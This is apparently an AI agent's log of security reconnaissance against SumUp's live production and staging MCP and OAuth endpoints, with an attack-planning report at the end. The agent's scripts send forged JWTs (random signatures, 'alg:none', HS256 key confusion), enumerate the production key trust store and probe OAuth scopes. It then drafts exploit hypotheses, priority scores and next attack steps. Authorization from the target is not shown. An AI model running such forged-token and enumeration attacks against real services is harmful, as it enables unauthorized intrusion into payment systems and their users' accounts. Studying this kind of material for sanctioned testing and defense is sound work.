+cases=[("A_stg_kid_loadtesting",      tok("RS256","loadtesting")),
+       ("B_PROD_kid_38618372",        tok("RS256","public:38618372-f016-4e5d-97b2-d043a975d243")),
+       ("C_PROD_kid_named_1zsCqlo8",  tok("RS256","1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM")),
+       ("D_unknown_kid",              tok("RS256","kid-does-not-exist-0000")),
+       ("E_no_kid",                   tok("RS256",None)),
+       ("F_alg_ES256_stg_kid",         tok("ES256","loadtesting"))]
+def cls(b):
+    return "PARSE_INVALID" if "Invalid access token" in b else ("AUTH_REQUIRED" if "Authentication required" in b else "OTHER:"+b[:90])
+for name,t in cases:
+    subprocess.run(["curl","-s","-m","20","-o","bb.txt","-w","%{http_code}","-H",f"Authorization: {t}",
+                    "-H","Accept: application/json, text/event-stream","https://mcp.sam-app.ro/mcp"],capture_output=True,text=True)
+    b=open("bb.txt").read(); print(f"  {name:30} -> {cls(b)}")
+    time.sleep(1)
+print("\nPROD host control: mcp.sumup.com/mcp with a STAGING kid")
+subprocess.run(["curl","-s","-m","20","-o","bb.txt","-w","http=%{http_code} ","-H",f"Authorization: {tok('RS256','loadtesting')}",
+                "-H","Accept: application/json, text/event-stream","https://mcp.sumup.com/mcp"],capture_output=True,text=True)
+print("  ",open("bb.txt").read()[:180].replace("\n"," "))
+PY
+staging kids: ['2ca76842-2487-428f-a87f-603d1f6f6ef0', 'ugK7GDfOf35HE5n2Pwsy9K3HSnYWNPGbRnWRscc83Lg', 'public:73c59380-fbab-4a2f-8d0e-1884cf8ec724', 'public:b2aafe4c-7d7f-4f32-90a7-66a0fc9cd097', 'public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a', 'public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9', 'public:3862035e-6139-422f-b17d-cf67b950a74f', 'public:e1d0f7e4-aab6-424e-8e2b-7549ac77f514', 'public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a', 'public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9', 'loadtesting']
+prod kids   : ['public:38618372-f016-4e5d-97b2-d043a975d243', 'public:15e78ad0-fb53-4e26-9d7c-2618e6109ae9', 'public:8c332d17-2b35-4cba-a61e-6843b4375a71', 'public:a4627362-0900-4bfa-8b68-3a740165dbcf', 'public:32ad4b15-8641-4aaa-9a2e-427bb1848321', 'public:8e43ec38-e8f1-47e4-aa6c-9990c3ae20b3', '1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM', '-tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4']
+  A_stg_kid_loadtesting          -> PARSE_INVALID
+  B_PROD_kid_38618372            -> PARSE_INVALID
+  C_PROD_kid_named_1zsCqlo8      -> PARSE_INVALID
+  D_unknown_kid                  -> PARSE_INVALID
+  E_no_kid                       -> PARSE_INVALID
+  F_alg_ES256_stg_kid            -> PARSE_INVALID
+
+PROD host control: mcp.sumup.com/mcp with a STAGING kid
+   {"error":"invalid_token","error_description":"no applicable key found in the JSON Web Key Set"}
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && python3 - <<'PY'
+import json, base64, os, subprocess, time
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+prd=json.load(open("prod_jwks.json"))["keys"]; stg=json.load(open("stg_jwks.json"))["keys"]
+C={"iss":"https://auth.sumup.com","sub":"probe","aud":"https://mcp.sumup.com/mcp","exp":4102444800,
+   "iat":1789000000,"scp":["offline_access","email"],"scope":"offline_access email"}
+pl=b64u(json.dumps(C).encode())
+def H(alg,kid):
+    o={"alg":alg,"typ":"JWT"}
+    if kid: o["kid"]=kid
+    return b64u(json.dumps(o).encode())
+def tok(alg,kid): return f"Bearer {H(alg,kid)}.{pl}.{b64u(os.urandom(32))}"
+def nonesig(alg,kid): return f"Bearer {H(alg,kid)}.{pl}."
+pk=prd[0]["kid"]; prd_named=next(k["kid"] for k in prd if not k["kid"].startswith("public:"))
+cases=[("PROD_kid_published_rs256",  tok("RS256",pk)),
+       ("PROD_kid_published_none",   nonesig("none",pk)),
+       ("PROD_kid_named_1zsCqlo8",   tok("RS256",prd_named)),
+       ("PROD_kid_unknown",          tok("RS256","kid-not-in-any-jwks-0001")),
+       ("PROD_kid_staging_loadtesting",tok("RS256","loadtesting")),
+       ("STG_kid_public_73c59380",   tok("RS256","public:73c59380-fbab-4a2f-8d0e-1884cf8ec724")),
+       ("PROD_no_kid",               tok("RS256",None)),
+       ("PROD_hs256_pubkey",         "Bearer "+H("HS256",pk)+"."+pl+"."+b64u(os.urandom(32)))]
+def cls(b):
+    s=b.strip().replace("\n"," ")[:170]
+    if "no applicable key" in s: return "A_NO_KEY_IN_JWKS"
+    if "Invalid access token" in s or "invalid_token" in s.lower(): return "B_INVALID_TOKEN: "+s
+    return "C_OTHER: "+s
+for name,t in cases:
+    subprocess.run(["curl","-s","-m","20","-o","bb.txt","-w","%{http_code}","-H",f"Authorization: {t}",
+        "-H","Accept: application/json, text/event-stream","https://mcp.sumup.com/mcp"],capture_output=True,text=True)
+    code=subprocess.run(["curl","-s","-m","20","-o","bb.txt","-w","%{http_code}","-H",f"Authorization: {t}",
+        "-H","Accept: application/json, text/event-stream","https://mcp.sumup.com/mcp"],capture_output=True,text=True).stdout
+    print(f"  {name:30} http={code:4} -> {cls(open('bb.txt').read())}")
+    time.sleep(1)
+PY
+PROD_kid_published_rs256       http=401  -> B_INVALID_TOKEN: {"error":"invalid_token","error_description":"signature verification failed"}
+  PROD_kid_published_none        http=401  -> B_INVALID_TOKEN: {"error":"invalid_token","error_description":"Unsupported \"alg\" value for a JSON Web Key Set"}
+  PROD_kid_named_1zsCqlo8        http=401  -> B_INVALID_TOKEN: {"error":"invalid_token","error_description":"signature verification failed"}
+  PROD_kid_unknown               http=401  -> A_NO_KEY_IN_JWKS
+  PROD_kid_staging_loadtesting   http=401  -> A_NO_KEY_IN_JWKS
+  STG_kid_public_73c59380        http=401  -> A_NO_KEY_IN_JWKS
+  PROD_no_kid                    http=401  -> B_INVALID_TOKEN: {"error":"invalid_token","error_description":"multiple matching keys found in the JSON Web Key Set"}
+  PROD_hs256_pubkey              http=401  -> B_INVALID_TOKEN: {"error":"invalid_token","error_description":"Unsupported \"alg\" value for a JSON Web Key Set"}
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && python3 - <<'PY'
+import json, base64, os, subprocess, time
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+prd=json.load(open("prod_jwks.json"))["keys"]; stg=json.load(open("stg_jwks.json"))["keys"]
+C={"iss":"https://auth.sumup.com","sub":"probe","aud":"https://mcp.sumup.com/mcp","exp":4102444800,
+   "iat":1789000000,"scp":["offline_access","email"],"scope":"offline_access email"}
+pl=b64u(json.dumps(C).encode())
+def H(alg,kid):
+    o={"alg":"RS256","typ":"JWT"}
+    if alg!="RS256": o["alg"]=alg
+    if kid is not None: o["kid"]=kid
+    return b64u(json.dumps(o).encode())
+def probe(alg,kid):
+    t=f"Bearer {H(alg,kid)}.{pl}.{b64u(os.urandom(32))}"
+    subprocess.run(["curl","-s","-m","20","-o","bb.txt","-H",f"Authorization: {t}",
+      "-H","Accept: application/json, text/event-stream","https://mcp.sumup.com/mcp"],capture_output=True,text=True)
+    b=open("bb.txt").read()
+    if "no applicable key" in b: return "ABSENT"
+    if "signature verification failed" in b: return "**TRUSTED**"
+    if "multiple matching keys" in b: return "NO_KID_TRYALL"
+    if "Unsupported" in b: return "ALG_REJECTED"
+    return "OTHER: "+b.strip()[:90]
+pubd={k["kid"] for k in prd}; stgd={k["kid"] for k in stg}
+cands=[]
+for k in sorted(pubd): cands.append(("published-prod",k))
+for k in sorted(stgd): cands.append(("staging-key",k))
+for k in ["loadtesting","public:loadtesting","dev","test","staging","public","sumup","local",
+          "public:00000000-0000-0000-0000-000000000000","","public:1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM",
+          "public:-tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4","1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM"]:
+    cands.append(("other-guess",k))
+present=[]; absent=[]; other=[]
+for origin,kid in cands:
+    r=probe("RS256",kid)
+    (present if r=="**TRUSTED**" else absent if r=="ABSENT" else other).append((origin,kid,r))
+    print(f"  {origin:14} kid={kid[:52]:54} -> {r}")
+    time.sleep(1)
+print(f"\nTRUSTED={len(present)} ABSENT={len(absent)} OTHER={len(other)}")
+print("present:",present); print("other:",other)
+print("\n--- alg matrix, no kid (try-all path) ---")
+for alg in ["RS256","RS384","RS512","PS256","ES256","EdDSA","HS256","none"]:
+    print(f"  alg={alg:6} -> {probe(alg,None)}"); time.sleep(1)
+PY
+published-prod kid=-tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4            -> ABSENT
+  published-prod kid=1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM            -> **TRUSTED**
+  published-prod kid=public:15e78ad0-fb53-4e26-9d7c-2618e6109ae9            -> **TRUSTED**
+  published-prod kid=public:32ad4b15-8641-4aaa-9a2e-427bb1848321            -> **TRUSTED**
+  published-prod kid=public:38618372-f016-4e5d-97b2-d043a975d243            -> **TRUSTED**
+  published-prod kid=public:8c332d17-2b35-4cba-a61e-6843b4375a71            -> **TRUSTED**
+  published-prod kid=public:8e43ec38-e8f1-47e4-aa6c-9990c3ae20b3            -> **TRUSTED**
+  published-prod kid=public:a4627362-0900-4bfa-8b68-3a740165dbcf            -> **TRUSTED**
+  staging-key    kid=2ca76842-2487-428f-a87f-603d1f6f6ef0                   -> ABSENT
+  staging-key    kid=loadtesting                                            -> ABSENT
+  staging-key    kid=public:3862035e-6139-422f-b17d-cf67b950a74f            -> ABSENT
+  staging-key    kid=public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a            -> ABSENT
+  staging-key    kid=public:73c59380-fbab-4a2f-8d0e-1884cf8ec724            -> ABSENT
+  staging-key    kid=public:b2aafe4c-7d7f-4f32-90a7-66a0fc9cd097            -> ABSENT
+  staging-key    kid=public:e1d0f7e4-aab6-424e-8e2b-7549ac77f514            -> ABSENT
+  staging-key    kid=public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9            -> ABSENT
+  staging-key    kid=ugK7GDfOf35HE5n2Pwsy9K3HSnYWNPGbRnWRscc83Lg            -> ABSENT
+  other-guess    kid=loadtesting                                            -> ABSENT
+  other-guess    kid=public:loadtesting                                     -> ABSENT
+  other-guess    kid=dev                                                    -> ABSENT
+  other-guess    kid=test                                                   -> ABSENT
+  other-guess    kid=staging                                                -> ABSENT
+  other-guess    kid=public                                                 -> ABSENT
+  other-guess    kid=sumup                                                  -> ABSENT
+  other-guess    kid=local                                                  -> ABSENT
+  other-guess    kid=public:00000000-0000-0000-0000-000000000000            -> ABSENT
+  other-guess    kid=                                                       -> ABSENT
+  other-guess    kid=public:1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM     -> ABSENT
+  other-guess    kid=public:-tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4     -> ABSENT
+  other-guess    kid=1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM            -> **TRUSTED**
+
+TRUSTED=8 ABSENT=22 OTHER=0
+present: [('published-prod', '1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM', '**TRUSTED**'), ('published-prod', 'public:15e78ad0-fb53-4e26-9d7c-2618e6109ae9', '**TRUSTED**'), ('published-prod', 'public:32ad4b15-8641-4aaa-9a2e-427bb1848321', '**TRUSTED**'), ('published-prod', 'public:38618372-f016-4e5d-97b2-d043a975d243', '**TRUSTED**'), ('published-prod', 'public:8c332d17-2b35-4cba-a61e-6843b4375a71', '**TRUSTED**'), ('published-prod', 'public:8e43ec38-e8f1-47e4-aa6c-9990c3ae20b3', '**TRUSTED**'), ('published-prod', 'public:a4627362-0900-4bfa-8b68-3a740165dbcf', '**TRUSTED**'), ('other-guess', '1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM', '**TRUSTED**')]
+other: []
+
+--- alg matrix, no kid (try-all path) ---
+  alg=RS256  -> NO_KID_TRYALL
+  alg=RS384  -> ABSENT
+  alg=RS512  -> ABSENT
+  alg=PS256  -> ABSENT
+  alg=ES256  -> ABSENT
+  alg=EdDSA  -> **TRUSTED**
+  alg=HS256  -> ALG_REJECTED
+  alg=none   -> ALG_REJECTED
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && echo "=== PROD mcp RFC9728 (pair with staging) ===" && for u in "/.well-known/oauth-protected-resource" "/.well-known/oauth-protected-resource/mcp"; do printf "%-46s " "$u"; curl -s -m 15 -o p.json -w "http=%{http_code} " "https://mcp.sumup.com$u"; head -c 320 p.json | tr -d '\n'; echo; sleep 1; done; echo; echo "=== staging no-kid alg matrix (try-all path) ===" && python3 - <<'PY'
+import json, base64, os, subprocess, time
+def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+C={"iss":"https://auth.sam-app.ro/","sub":"probe","aud":"https://mcp.sam-app.ro/mcp","exp":4102444800,"iat":1789000000,"scp":["offline_access","email"]}
+pl=b64u(json.dumps(C).encode())
+def p(alg,kid=None):
+    o={"alg":alg,"typ":"JWT"}
+    if kid: o["kid"]=kid
+    t=f"Bearer {b64u(json.dumps(o).encode())}.{pl}.{b64u(os.urandom(32))}"
+    subprocess.run(["curl","-s","-m","20","-o","bb.txt","-H",f"Authorization: {t}","-H","Accept: application/json, text/event-stream","https://mcp.sam-app.ro/mcp"],capture_output=True,text=True)
+    b=open("bb.txt").read().strip()[:120]
+    if "multiple matching" in b: return "MULTIKEY_TRYALL"
+    if "Invalid access token" in b: return "INVALID_TOKEN(parsed)"
+    if "Authentication required" in b: return "AUTH_REQUIRED(unparsed)"
+    return "OTHER: "+b
+for a in ["RS256","RS512","ES256","EdDSA","HS256","none"]:
+    print(f"  alg={a:6} -> {p(a)}"); time.sleep(1)
+print("  stg kid=loadtesting, alg=RS256 ->", p("RS256","loadtesting"))
+PY
+=== PROD mcp RFC9728 (pair with staging) ===
+/.well-known/oauth-protected-resource          http=200 {"resource":"https://mcp.sumup.com/mcp","authorization_servers":["https://auth.sumup.com"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+/.well-known/oauth-protected-resource/mcp      http=200 {"resource":"https://mcp.sumup.com/mcp","authorization_servers":["https://auth.sumup.com"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+
+=== staging no-kid alg matrix (try-all path) ===
+  alg=RS256  -> INVALID_TOKEN(parsed)
+  alg=RS512  -> INVALID_TOKEN(parsed)
+  alg=ES256  -> INVALID_TOKEN(parsed)
+  alg=EdDSA  -> INVALID_TOKEN(parsed)
+  alg=HS256  -> INVALID_TOKEN(parsed)
+  alg=none   -> INVALID_TOKEN(parsed)
+  stg kid=loadtesting, alg=RS256 -> INVALID_TOKEN(parsed)
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && RD="https%3A%2F%2Fme.sumup.com%2Fapi%2Fsso%2Fcallback" && for sc in "email" "offline_access" "email%20offline_access" "openid%20email%20offline_access" "readers.read"; do printf "scope=%-34s " "$sc"; curl -s -m 15 -o r.txt -w "http=%{http_code} " "https://auth.sumup.com/oauth2/auth?client_id=dashboard&redirect_uri=$RD&response_type=code&state=teststate12345&scope=$sc"; if grep -qi "invalid_scope" r.txt; then echo "-> 303 invalid_scope (REJECTED)"; else loc=$(grep -io 'location:.*' r.txt | head -c 150); echo "-> ACCEPTED $loc"; fi; sleep 1; done
+scope=email                              http=302 -> ACCEPTED 
+scope=offline_access                     http=303 -> ACCEPTED 
+scope=email%20offline_access             http=303 -> ACCEPTED 
+scope=openid%20email%20offline_access    http=303 -> ACCEPTED 
+scope=readers.read                       http=302 -> ACCEPTED
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && RD="https%3A%2F%2Fme.sumup.com%2Fapi%2Fsso%2Fcallback" && for sc in "email" "offline_access" "email%20offline_access" "openid%20email%20offline_access" "readers.read" "totally.bogus.scope"; do printf "scope=%-36s " "$sc"; curl -s -m 15 -D - -o /dev/null "https://auth.sumup.com/oauth2/auth?client_id=dashboard&redirect_uri=$RD&response_type=code&state=teststate12345&scope=$sc" 2>/dev/null | grep -iE "^(HTTP/|location)" | tr -d '\r' | sed 's/^location: //I' | cut -c1-150 | tr '\n' ' '; echo; sleep 1; done
+scope=email                                HTTP/2 302  https://auth.sumup.com/flows/auth-callback?login_challenge=49a3e9973e1944b4b9cb741639b08a91 
+scope=offline_access                       HTTP/2 303  https://me.sumup.com/api/sso/callback?error=invalid_scope&error_description=The+requested+scope+is+invalid%2C+unknown%2C+or+malformed.+The+OAuth+2.0+C 
+scope=email%20offline_access               HTTP/2 303  https://me.sumup.com/api/sso/callback?error=invalid_scope&error_description=The+requested+scope+is+invalid%2C+unknown%2C+or+malformed.+The+OAuth+2.0+C 
+scope=openid%20email%20offline_access      HTTP/2 303  https://me.sumup.com/api/sso/callback?error=invalid_scope&error_description=The+requested+scope+is+invalid%2C+unknown%2C+or+malformed.+The+OAuth+2.0+C 
+scope=readers.read                         HTTP/2 302  https://auth.sumup.com/flows/auth-callback?login_challenge=c7eea6495ca544c48192a85cdc92f181 
+scope=totally.bogus.scope                  HTTP/2 303  https://me.sumup.com/api/sso/callback?error=invalid_scope&error_description=The+requested+scope+is+invalid%2C+unknown%2C+or+malformed.+The+OAuth+2.0+C
+[0m
+[0m$ [0mcd /tmp/opencode/sumup && RD="https%3A%2F%2Fme.sumup.com%2Fapi%2Fsso%2Fcallback" && for sc in "openid" "classic" "offline" "terminals.read" "email%20readers.read" "email%20openid"; do printf "scope=%-24s " "$sc"; L=$(curl -s -m 15 -D - -o /dev/null "https://auth.sumup.com/oauth2/auth?client_id=dashboard&redirect_uri=$RD&response_type=code&state=teststate12345&scope=$sc" 2>/dev/null | grep -i "^location:" | tr -d '\r' | sed 's/^location: //I'); if echo "$L" | grep -q login_challenge; then echo "ALLOWED"; else echo "REJECTED"; fi; sleep 1; done
+scope=openid                   ALLOWED
+scope=classic                  ALLOWED
+scope=offline                  ALLOWED
+scope=terminals.read           ALLOWED
+scope=email%20readers.read     ALLOWED
+scope=email%20openid           ALLOWED
+[0m
+## STEP 1 — DELTA
+
+[NEW] `mcp.sumup.com/.well-known/oauth-protected-resource` → **200** (prod, never fetched in 29 cycles — KB only recorded `/.well-known/mcp.json` 404 on 2026-09-07). Body: `{"resource":"https://mcp.sumup.com/mcp","authorization_servers":["https://auth.sumup.com"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}`. Byte-identical document also served at the per-resource path `/.well-known/oauth-protected-resource/mcp` (both 200, 272 B).
+
+[NEW] `mcp.sam-app.ro` publishes the same RFC 9728 document bound to `https://auth.sam-app.ro/` (trailing slash) at both paths (200, 272 B) — per-environment authorization-server binding confirmed; the field is `scopes_supported`, **not** `resource_scopes`.
+
+[NEW] `mcp.sumup.com/mcp` bearer verifier exposes a **4-class unauthenticated kid/alg oracle**: `no applicable key found in the JSON Web Key Set` (kid absent from trust store) vs `signature verification failed` (kid trusted, sig wrong) vs `Unsupported "alg" value for a JSON Web Key Set` (alg `none` + `HS256`) vs `multiple matching keys found in the JSON Web Key Set` (no `kid`).
+
+[NEW] RFC 8725 §3.11 deviation, prod only: `kid` is **not mandatory** on `mcp.sumup.com/mcp`. Omitting it puts the verifier on a try-all path (`multiple matching keys found in the JSON Web Key Set`), widening the forgery target from 1 key to the 7 RSA keys with no kid knowledge required.
+
+[NEW] Prod trust-store sweep, 30 `kid` candidates: exactly the **8 published prod kids trusted, 22 absent, 0 undeclared** (all 9 staging kids absent, incl. `loadtesting`; 11 name-guesses absent). No stale, rotated-but-trusted, or rogue key in the prod MCP trust store.
+
+[NEW] `mcp.sumup.com/mcp` enforces a 2-value alg allowlist `{RS256, EdDSA}`: RS384/RS512/PS256/ES256 → `no applicable key`; HS256 and `none` → `Unsupported "alg" value`. RS256→HS256 confusion and `alg:none` are both explicitly refused.
+
+[NEW] `client_id=dashboard` **can obtain `email`** (302 `login_challenge`) — `email` is one of the two scopes `mcp.sumup.com` declares in its RFC 9728 `scopes_supported`.
+
+[CHANGED] `dashboard` consent set measured in full this cycle: ALLOWED `{openid, classic, offline, readers.read, terminals.read, email}` (combinations `email readers.read`, `email openid` also allowed); REJECTED `invalid_scope` for `{offline_access, email offline_access, openid email offline_access, totally.bogus.scope}`. KB 2026-09-16's "readers.read/terminals.read are the ONLY scopes" is incomplete, and the 2026-09-04 catalog listing `offline` beside accounting/invoices/api_keys/lending/receivables/UCD does not hold for those 13 REST scopes.
+
+[CHANGED] Staging JWKS carries **2 duplicated key entries** — `public:3a13954d-…` and `public:f06a4960-…` each appear twice; 11 entries = **9 unique keys**. KB's "staging 11 keys" is 9 unique (zero-overlap vs prod 8 unaffected).
+
+[CHANGED] `api.sam-app.ro` gateway: **no bearer-validation discriminator is reproducible.** 7 paths (`/`, `/zzzz`, `/v0.1/transactions`, `/v0.1/merchants/{code}/transactions?limit=1`, `/v0.1/merchants/{code}/accounts`, `/v0.1/payouts`, `/v0.2/checkouts/{uuid}`) return the identical 150-byte `problem+json` 404 for no-auth, malformed, `alg:none`, and HS256-PEM-confusion alike. The standing KB claim "structured vs plain 404 with/without token" is **not reproducible**; the real discriminator lives on `mcp.sam-app.ro/mcp`.
+
+[CHANGED] `mcp.sam-app.ro/mcp` has a **2-class** oracle (`Invalid access token` = token parsed, `Authentication required` = absent/unparsed), accepts all 6 alg values into the parser including `HS256` and `none`, and discloses **no** kid-lookup or try-all detail → the prod-only oracle is not shared between environments.
+
+[CHANGED] Prod vs staging MCP bearer rejection are different implementations: prod = RFC 6750 `{"error":"invalid_token","error_description":…}`; staging = JSON-RPC `-32010` envelope. `api.sam-app.ro/v0.1/merchants/MH4H92C7/payment-methods` returns 200 `{"available_payment_methods":[{"id":"card"}]}` unauth — the same param-invariant stub as prod.
+
+[CHANGED] RFC 9728 absent on the app hosts: `chat.sumup.com` (Next 404 shell, despite a real authenticated API), `me.sumup.com`, `help.sumup.com` (Next shells); `checkout.sumup.com` + `pay.sumup.com` → Vercel `pdx1` 403; `gateway.sumup.com` → non-Next 404 (`The page could not be found` + `pdx1::` id), confirming it is not a Next.js deployment.
+
+## STEP 2 — PRIORITIZE
+
+[PRIO] mcp.sumup.com/mcp,8.15,attack_surface:7 business_value:8 tech_exposure:9 gate_ease:9 cloud_surface:7 freshness:10
+[PRIO] mcp.sam-app.ro/mcp (+ RFC 9728),7.50,attack_surface:9 business_value:5 tech_exposure:7 gate_ease:9 cloud_surface:6 freshness:10
+[PRIO] auth.sam-app.ro/oauth2/register,6.90,attack_surface:7 business_value:6 tech_exposure:9 gate_ease:10 cloud_surface:5 freshness:3
+[PRIO] api.sumup.com/v0.2/checkouts/{id}/apple-pay-session,5.85,attack_surface:6 business_value:9 tech_exposure:8 gate_ease:2 cloud_surface:4 freshness:2
+
+## STEP 3 — HYPOTHESES
+
+[HYP] The prod MCP agent surface's declared scope model is satisfiable by the stock merchant dashboard client, so it may be reachable from an ordinary merchant session with no developer OAuth app
+class: OATH
+asset: mcp.sumup.com/mcp (bearer verifier + /.well-known/oauth-protected-resource)
+confidence: 62
+reasoning: RFC 9728 metadata (200, prod) declares `authorization_servers:["https://auth.sumup.com"]` and `scopes_supported:["offline_access","email"]`, resource `https://mcp.sumup.com/mcp`. The scope-acceptance oracle on the modern auth server (302 `login_challenge` = allowed, 303 `invalid_scope` = rejected, calibrated against `totally.bogus.scope` → rejected) shows `client_id=dashboard` ACCEPTS `email` (302 `login_challenge=49a3e997…`) and REJECTS `offline_access` (303 `invalid_scope`). `dashboard` is the client every ordinary merchant already authorizes via me.sumup.com. The MCP bearer verifier enforces a 2-alg allowlist {RS256, EdDSA}, refuses `none`/HS256 explicitly, and its trust store is exactly the 8 published prod kids (30-candidate sweep, 0 undeclared) — so the verifier is sound and the open question is purely the scope/audience binding between `dashboard`-issued tokens and the MCP resource server.
+evidence_needed: one completed authorization_code exchange as `client_id=dashboard` with `scope=email` yielding a token, presented to `mcp.sumup.com/mcp`; acceptance (non-401) with a JSON-RPC `initialize` reply = prod MCP reachable from a merchant web session.
+verify_steps: PASSIVE-COMPLETE for the scope half — `curl -sD- -o/dev/null "https://auth.sumup.com/oauth2/auth?client_id=dashboard&redirect_uri=https%3A%2F%2Fme.sumup.com%2Fapi%2Fsso%2Fcallback&response_type=code&state=teststate12345&scope=email"` → `302 https://auth.sumup.com/flows/auth-callback?login_challenge=…` (executed: ALLOWED). Remaining leg needs a merchant session token: `curl -sD- -H "Authorization: Bearer $TOKEN" -H "Accept: application/json, text/event-stream" https://mcp.sumup.com/mcp` (POST JSON-RPC `initialize`, ≤1 rps, own merchant account only).
+impact: if accepted, the agent surface documented as a developer integration is reachable by any authenticated SumUp merchant via the stock dashboard client — privilege-boundary erosion across the OAuth trust graph; the same scope also satisfies the RFC 9728 declaration that currently implies a developer-only audience. Medium if confirmed; the cross-resource confusion is the material risk, not token theft.
+testability: AUTH_HELPED
+
+[HYP] Unauthenticated RFC 7591 dynamic client registration on staging mints gateway-valid JWTs
+class: AUTH
+asset: auth.sam-app.ro/oauth2/register
+confidence: 85
+reasoning: unauth POST `/oauth2/register` → 201 `client_id`+`client_secret`+chosen `redirect_uris`, declared in staging `openid-configuration`; `client_credentials` (`client_secret_post`) mints a real JWT accepted at `api.sam-app.ro`. Bounded: `scp:[]` empty, per-client redirect allowlist enforced, prod JWKS (8 kids) vs staging (9 unique / 11 entries) ZERO kid overlap, and `mcp.sam-app.ro` rejects empty-scope tokens with `Invalid access token`. Absent in prod `auth.sumup.com` (`/register` 404 GET/POST/OPTIONS). Evidence complete and self-contained.
+evidence_needed: none — no further passive or active test adds information.
+verify_steps: not applicable — PASSIVE; sole remaining action is HUMAN submission to bugs.olivermaicher.eu.
+impact: attacker-registered OAuth clients plus mintable staging-gateway-valid JWTs on a publicly reachable staging stack — Medium (triage-VALID 7.5, `reports/valid-bugs.md` lines 64/79).
+testability: PASSIVE
+
+[HYP] The staging MCP verifier's claim-scope gate is evaluated after token acceptance, so a dynamic-client token carrying injected scope claims would be distinguishable from an empty-scope one
+class: AUTH
+asset: mcp.sam-app.ro/mcp (RFC 9728 `scopes_supported:["offline_access","email"]`)
+confidence: 45
+reasoning: staging RFC 9728 (200, both paths) declares `scopes_supported:["offline_access","email"]` while dynamically registered clients are forced to empty scope, so the declared model is unreachable by any registerable client. The endpoint exposes a 2-class parse oracle (`Invalid access token` = parsed, `Authentication required` = absent) and accepts all 6 alg values into the parser including `HS256` and `none`, i.e. alg is validated after parse. Whether scope is checked before or after the audience/`iss` gate is unknown, and the 2-class oracle is exactly the instrument to measure it. Prod, by contrast, exposes a 4-class kid/alg oracle; staging exposes none of that detail.
+evidence_needed: register a dynamic client on staging, mint a token via `client_credentials`, then compare the `/mcp` response class for `scp:[]` versus `scp:["offline_access","email"]`; a class change proves claim order and whether `scopes_supported` is enforced at all.
+verify_steps: after minting (POST `/oauth2/register`, then POST `/oauth2/token` `grant_type=client_credentials`), `GET https://mcp.sam-app.ro/mcp` with `Authorization: Bearer <token>` twice, once per claim set, ≤1 rps, own client only.
+impact: if `scopes_supported` is declarative only, the staging MCP agent surface is reachable by any anonymous registrant with a fabricated scope claim — Low/Medium, staging-scoped, prod may differ (prod rejects staging keys).
+testability: AUTH_HELPED
+
+## STEP 4 — SELF-CRITIQUE
+
+[PARKED] Prod `kid`-optional try-all deviation on mcp.sumup.com/mcp: real and reproducible (`multiple matching keys found in the JSON Web Key Set`), RFC 8725 §3.11 non-compliance, but the verifier is otherwise sound — alg allowlist {RS256, EdDSA}, `none`/HS256 refused, trust store exactly the 8 published kids. Widening 1-of-1 to 1-of-7 has no exploit path while every private key is held, so it is hardening plus trust-store-membership disclosure, not a bypass. Kept as supporting evidence inside H1, not as a standalone claim.
+[PARKED] `api.sam-app.ro` gateway bearer validation: no discriminator reproducible on 7 paths; cannot distinguish "validates silently" from "does not validate" passively, and the KB's prior "structured vs plain 404" control does not reproduce. Archived as a KB correction.
+[PARKED] apple-pay-session SSRF (60, AUTH_HELPED) unchanged; still requires an own-checkout bearer.
+[FINAL] 1) mcp.sumup.com MCP scope-boundary via `dashboard`+`email` (62, AUTH_HELPED, Medium if confirmed) — only lead this cycle that could yield a prod authorization finding; 2) auth.sam-app.ro dynamic registration (85, PASSIVE, complete — blocked solely on HUMAN submission); 3) mcp.sam-app.ro scope-claim ordering (45, AUTH_HELPED, staging).
+
+## STEP 5 — NEXT ACTION
+
+[NEXT] HUMAN: Request a SumUp test-mode merchant API key from developer.sumup.com and record it in `reports/valid-bugs.md` as the AUTH_HELPED credential. It unblocks three surviving leads in one step — the prod MCP claim-binding test (`curl -sD- -X POST -H "Authorization: Bearer $KEY" -H "Accept: application/json, text/event-stream" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' https://mcp.sumup.com/mcp`, own merchant, ≤1 rps), the apple-pay-session SSRF allowlist test, and the api.sumup.com `aud`/`iss` binding discrimination. No agent cycle can substitute for it, and it is the sole binding constraint on all three.
+
+## STEP 6 — LEARNING
+
